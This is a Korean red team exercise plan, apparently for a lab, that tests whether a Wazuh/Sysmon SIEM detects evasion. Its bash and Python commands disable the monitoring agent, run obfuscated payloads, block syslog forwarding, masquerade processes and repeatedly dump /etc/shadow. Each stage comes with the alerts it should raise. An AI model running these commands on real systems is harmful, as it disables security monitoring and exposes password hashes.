# Red Team Tier 4: SIEM 탐지 우회 공격

## MITRE ATT&CK 매핑

```
T1562.001 Disable or Modify Tools → T1027 Obfuscated Files or Information
→ T1562.006 Indicator Blocking → T1036.005 Masquerading: Match Legitimate Name
```

## 목표

보안 시스템 자체를 무력화하거나 탐지를 우회하는 고급 기법 테스트.
Blue Team이 이를 감지하고 복구할 수 있는지 평가.

---

## 공격 단계

### Stage 1: Wazuh Agent 무력화 시도 (T1562.001)

```bash
# Wazuh agent 프로세스 정지 시도
systemctl stop wazuh-agent 2>/dev/null
kill -STOP $(pidof wazuh-agentd) 2>/dev/null

# agent 설정 변조 (syscheck 비활성화)
sed -i 's|<disabled>no</disabled>|<disabled>yes</disabled>|' /var/ossec/etc/ossec.conf 2>/dev/null

# ossec.log 위치 변경 시도
mv /var/ossec/logs/ossec.log /var/ossec/logs/ossec.log.bak 2>/dev/null

# → Wazuh Manager가 agent heartbeat 소실 → 경보 발생해야 함
# → siem 서버에서 agent disconnection alert 생성
```

### Stage 2: 난독화된 페이로드 실행 (T1027)

```bash
# 2-1. Base64 인코딩된 명령 실행
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
# = cat /etc/passwd

# 2-2. XOR 인코딩된 페이로드 (python)
python3 -c "
import os
# XOR key=0x42, payload='id'
payload = bytes([i ^ 0x42 for i in b'id'])
os.system(payload.decode())
"

# 2-3. 환경변수 기반 실행 (명령어 직접 노출 없음)
export CMD=$(echo "d2hvYW1p" | base64 -d)  # whoami
eval "$CMD"

# 2-4. /dev/shm 메모리 파일시스템에서 실행 (디스크 무흔적)
echo '#!/bin/bash' > /dev/shm/.hidden
echo 'cat /etc/shadow' >> /dev/shm/.hidden
chmod +x /dev/shm/.hidden
/dev/shm/.hidden
rm -f /dev/shm/.hidden

# → Sysmon이 프로세스 생성 이벤트(base64, python, eval)를 탐지
# → AuditD가 /dev/shm 실행을 탐지
```

### Stage 3: Syslog 전송 방해 (T1562.006)

```bash
# rsyslog → SIEM 전송 차단 시도
# 내부 iptables로 syslog 포트 차단 (방화벽이 아닌 호스트 레벨)
iptables -A OUTPUT -p udp --dport 514 -d 10.20.30.100 -j DROP 2>/dev/null
iptables -A OUTPUT -p tcp --dport 1514 -d 10.20.30.100 -j DROP 2>/dev/null

# rsyslog 프로세스 정지 시도
systemctl stop rsyslog 2>/dev/null

# → Wazuh Manager가 로그 수신 중단 → 경보
# → syslog absence alert 발생해야 함
```

### Stage 4: 정상 프로세스 위장 (T1036.005)

```bash
# 악성 스크립트를 정상 서비스 이름으로 위장
cp /bin/bash /tmp/[kworker/0:1]  # 커널 워커 스레드로 위장
/tmp/'[kworker/0:1]' -c "cat /etc/shadow" 2>/dev/null

# systemd 서비스로 위장
cat > /tmp/system-health.service << 'EOF'
[Unit]
Description=System Health Monitor
[Service]
ExecStart=/bin/bash -c "while true; do cat /etc/shadow > /dev/shm/.dump; sleep 300; done"
[Install]
WantedBy=multi-user.target
EOF

# → Sysmon 프로세스 모니터링이 비정상 바이너리 경로 탐지
# → 프로세스 이름 vs 실행 경로 불일치 탐지
```

---

## 탐지 기대점

| 공격 | 탐지 소스 | 기대 경보 | 난이도 |
|------|---------|---------|--------|
| Agent 정지 | Wazuh Manager | Agent disconnected | 쉬움 |
| Agent 설정 변조 | Wazuh FIM | ossec.conf 변경 | 중간 |
| Base64 실행 | Sysmon→Wazuh | 의심 프로세스 체인 | 중간 |
| XOR 페이로드 | Sysmon→Wazuh | python→system() 체인 | 어려움 |
| /dev/shm 실행 | AuditD→Wazuh | 비표준 경로 실행 | 중간 |
| Syslog 차단 | Wazuh Manager | 로그 수신 중단 | 쉬움 |
| 프로세스 위장 | Sysmon→Wazuh | 이름/경로 불일치 | 어려움 |

---

## 학술적 수준 근거

- **Defense evasion** (T1562): 보안 시스템을 공격 대상으로 삼는 APT 레벨 기법
- **Living-off-the-Land** (LOL): base64, python, eval 등 시스템 내장 도구 악용
- **Memory-only execution**: /dev/shm 활용은 파일리스 공격의 Linux 버전
- **Process masquerading**: 실제 Cobalt Strike, Metasploit 등이 사용하는 기법
- 참고: *"Evasion Techniques Against Security Monitoring"* (BlackHat USA), *"Living-off-the-Land Detection"* (NDSS)
